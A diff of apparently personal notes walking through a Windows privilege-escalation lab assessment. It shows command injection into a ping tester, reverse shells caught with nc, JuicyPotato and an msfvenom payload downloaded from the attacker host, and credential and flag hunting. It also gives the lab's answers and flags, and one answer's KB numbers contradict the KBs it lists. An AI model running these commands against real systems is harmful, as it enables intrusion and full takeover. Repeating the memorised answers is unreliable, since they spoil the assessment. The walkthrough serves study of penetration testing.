@@ -43,8 +43,8 @@ Question 2 - Find the password for the ldapadmin account somewhere on the system
 3) downlaod juicypotato to kali machine and host python server 
 4) mkdir c:\temp -> on revshell sesh
 5) on rev shell -> Invoke-WebRequest -Uri "http://10.10.15.125:8000/JuicyPotato.exe" -OutFile "C:\temp\JuicyPotato.exe"
-6) on kali machine -> msfvenom -p cmd/windows/reverse_powershell lhost=10.10.15.125 lport=9999 > shell.bat
-7) onn rev  shell -> Invoke-WebRequest -Uri "http://10.10.15.125:8000/shell.bat" -OutFile "C:\temp\shell.bat"+
+6) on kali machine -> msfvenom -p cmd/windows/reverse_powershell lhost=10.10.15.183 lport=9999 > shell.bat
+7) onn rev  shell -> Invoke-WebRequest -Uri "http://10.10.15.183:8000/shell.bat" -OutFile "C:\temp\shell.bat"
 8) on kali in new terminal -> nc -nlvp 9999
 9) on rev shell in c:\temp -> .\JuicyPotato.exe -t * -l 9999 -p "C:\temp\shell.bat" -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
 10) we have nt authorty \ system 
@@ -62,6 +62,123 @@ Question 4 - After escalating privileges, locate a file named confidential.txt. 
 1) dir C:\ /s /b | findstr /i “confidential.txt”
 2) after letting it run a bit use -> type “C:\Users\Administrator\Documents\My Music\confidential.txt”
 output : 5e5a7dafa79d923de3340e146318c31a 
+
+🧠 CPTS - Windows Privilege Escalation Skills Assessment I
+Environment: RDP exposed Windows Server 2016 (Ports 80 + 3389 open)
+
+✅ Goal
+Escalate to SYSTEM
+
+Extract flags
+
+Enumerate creds (ldapadmin, confidential.txt)
+
+🛰️ Workflow
+Step 1: Host Discovery
+bash
+Copy
+Edit
+nmap -Pn 10.129.246.157
+Found:
+
+80/tcp → HTTP Dev Connection Tester
+
+3389/tcp → RDP (don’t need to pivot for this challenge)
+
+Step 2: Command Injection via Dev Connection Tester
+Input field acts as ping command wrapper.
+
+bash
+Copy
+Edit
+127.0.0.1 | systeminfo
+Extract the KBs from output:
+
+KB3199986
+
+KB3200970
+
+Step 3: Reverse Shell via Powershell Payload
+Generate Powershell reverse shell payload from revsh3lls.com → Powershell #2
+
+Paste into input field, change shell type to /bin/bash
+
+Listen on attacker box:
+
+bash
+Copy
+Edit
+nc -nlvp 4444
+Step 4: Transfer Juicy Potato
+Host JuicyPotato on attacker machine:
+
+bash
+Copy
+Edit
+python3 -m http.server 8000
+Then on shell:
+
+powershell
+Copy
+Edit
+mkdir C:\temp
+Invoke-WebRequest -Uri "http://10.10.15.183:8000/JuicyPotato.exe" -OutFile "C:\temp\JuicyPotato.exe"
+Step 5: Build Shell Payload
+Generate .bat reverse shell:
+
+bash
+Copy
+Edit
+msfvenom -p cmd/windows/reverse_powershell lhost=10.10.15.183 lport=9999 > shell.bat
+Serve and download it:
+
+powershell
+Copy
+Edit
+Invoke-WebRequest -Uri "http://10.10.15.183:8000/shell.bat" -OutFile "C:\temp\shell.bat"
+Step 6: Launch JuicyPotato
+Run with CLSID from COM catalog:
+
+powershell
+Copy
+Edit
+.\JuicyPotato.exe -t * -l 9999 -p "C:\temp\shell.bat" -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
+Catch SYSTEM shell
+
+🔐 Question 1: KBs Installed
+Answer: 32100000&32100060 → derived from systeminfo
+
+🔐 Question 2: LDAPADMIN Password Extraction
+powershell
+Copy
+Edit
+powershell -Command "Get-ChildItem -Path C:\Users\ -Recurse -File | Select-String -Pattern 'ldapadmin'"
+Output:
+
+bindPassword="car3ful_st0rinG_cr3d$"
+
+🔐 Question 3: Flag.txt on Admin Desktop
+powershell
+Copy
+Edit
+type C:\Users\Administrator\Desktop\flag.txt
+Flag: Ev3ry_sysadm1ns_n1ghtMare!
+
+🔐 Question 4: Find confidential.txt
+cmd
+Copy
+Edit
+dir C:\ /s /b | findstr /i "confidential.txt"
+Found:
+C:\Users\Administrator\Documents\My Music\confidential.txt
+
+cmd
+Copy
+Edit
+type "C:\Users\Administrator\Documents\My Music\confidential.txt"
+Flag: 5e5a7dafa79d923de3340e146318c31a
+
+
 
 
 
